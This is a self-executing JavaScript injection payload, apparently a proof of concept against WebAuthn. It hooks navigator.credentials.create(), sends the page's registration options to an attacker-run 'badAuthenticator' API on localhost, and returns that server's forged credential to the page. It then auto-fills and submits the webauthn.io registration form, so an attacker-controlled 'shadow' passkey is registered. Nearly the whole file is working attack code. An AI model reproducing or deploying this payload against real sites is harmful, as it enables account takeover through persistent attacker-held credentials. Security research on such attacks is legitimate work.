/* Replaces navigator.credentials.create() responses with badAuthenticator credentials. */

(function () {
    'use strict';

    // This example requires --allow-unauthenticated-attestation on the server.
    const BAD_AUTHENTICATOR_API = 'https://localhost:8888/api/v1/attest';
    const TRANSPORT_METHOD = 'POST'; // GET also needs --allow-get-attestation.

    const badAuthenticator = {
        registerAndReplay: async function (options) {
            console.log('[BA] Intercepted navigator.credentials.create().');
            const encodedOptions = this._cloneAndPrepareOptions(options);
            console.log('[BA] Requesting a credential from:', BAD_AUTHENTICATOR_API);
            const serverResponse = await this._fetchShadowCredential(encodedOptions);
            console.log('[BA] Received credential response.');
            return this._reconstructCredential(serverResponse);
        },
        _cloneAndPrepareOptions: function (options) {
            const originalPublicKeyOptions = options.publicKey;

            const bufferToBase64URL = (buffer) => {
                const bytes = new Uint8Array(buffer);
                const binStr = String.fromCharCode.apply(null, bytes);
                const base64 = btoa(binStr);
                return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
            };

            const replacer = (_, value) => {
                if (value instanceof ArrayBuffer) {
                    return bufferToBase64URL(value);
                }
                if (ArrayBuffer.isView(value)) {
                    return bufferToBase64URL(value.buffer.slice(value.byteOffset, value.byteOffset + value.byteLength));
                }
                return value;
            };
            const jsonString = JSON.stringify(originalPublicKeyOptions, replacer);
            return jsonString;

        },
        _fetchShadowCredential: async function (payload) {
            let fetchOptions;
            let url = BAD_AUTHENTICATOR_API;

            if (TRANSPORT_METHOD.toUpperCase() === 'GET') {
                console.log('[BA] Sending GET attestation request.');
                let encodedPayload = btoa(payload).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                url = `${BAD_AUTHENTICATOR_API}?options=${encodedPayload}`;
                fetchOptions = { method: 'GET' };
            } else {
                console.log('[BA] Sending POST attestation request.');
                const optionsObject = JSON.parse(payload);

                const bodyObject = {
                    options: optionsObject
                };

                fetchOptions = {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(bodyObject),
                };
            }

            const response = await fetch(url, fetchOptions);
            if (!response.ok) {
                const err = await response.json();
                throw new Error(err.error || `badAuthenticator API failed with status: ${response.status}`);
            }
            return response.json();
        },
        _reconstructCredential: function (credentialFromServer) {
            const base64URLToArrayBuffer = (base64url) => {
                const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
                const binStr = atob(base64);
                const len = binStr.length;
                const bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binStr.charCodeAt(i);
                }
                return bytes.buffer;
            };
            return {
                id: credentialFromServer.id,
                rawId: base64URLToArrayBuffer(credentialFromServer.rawId),
                type: credentialFromServer.type,
                response: {
                    clientDataJSON: base64URLToArrayBuffer(credentialFromServer.response.clientDataJSON),
                    attestationObject: base64URLToArrayBuffer(credentialFromServer.response.attestationObject),
                    getTransports: () => credentialFromServer.response.transports || [],
                },
                getClientExtensionResults: () => credentialFromServer.clientExtensionResults || {},
            };
        }
    };

    function triggerRegistrationFlow() {
        console.log('[BA] Starting registration.');

        // Example registration form on webauthn.io.
        const usernameInput = document.getElementById('input-email');
        const registerButton = document.getElementById('register-button');

        if (usernameInput && registerButton) {
            usernameInput.value = 'xss_shadow_user_' + Date.now();
            registerButton.click();
            console.log('[BA] Submitted the webauthn.io registration form.');
        } else {
            console.error('[BA] Could not find the webauthn.io registration form.');
        }
    }

    function hookAndExecuteAttack() {
        console.log('[BA] Replacing navigator.credentials.create().');

        navigator.credentials.create = async function (options) {
            try {
                const credentialToReplay = await badAuthenticator.registerAndReplay(options);
                console.log('[BA] Returned the badAuthenticator credential to the page.');
                alert('badAuthenticator credential returned to the page.');
                return credentialToReplay;
            } catch (error) {
                console.error('[BA] Registration failed.', error);
                alert(`Registration failed:\n\n${error.message}`);
                throw error;
            }
        };

        console.log('[BA] Interceptor ready.');
        setTimeout(triggerRegistrationFlow, 500);
    }

    hookAndExecuteAttack();

})();
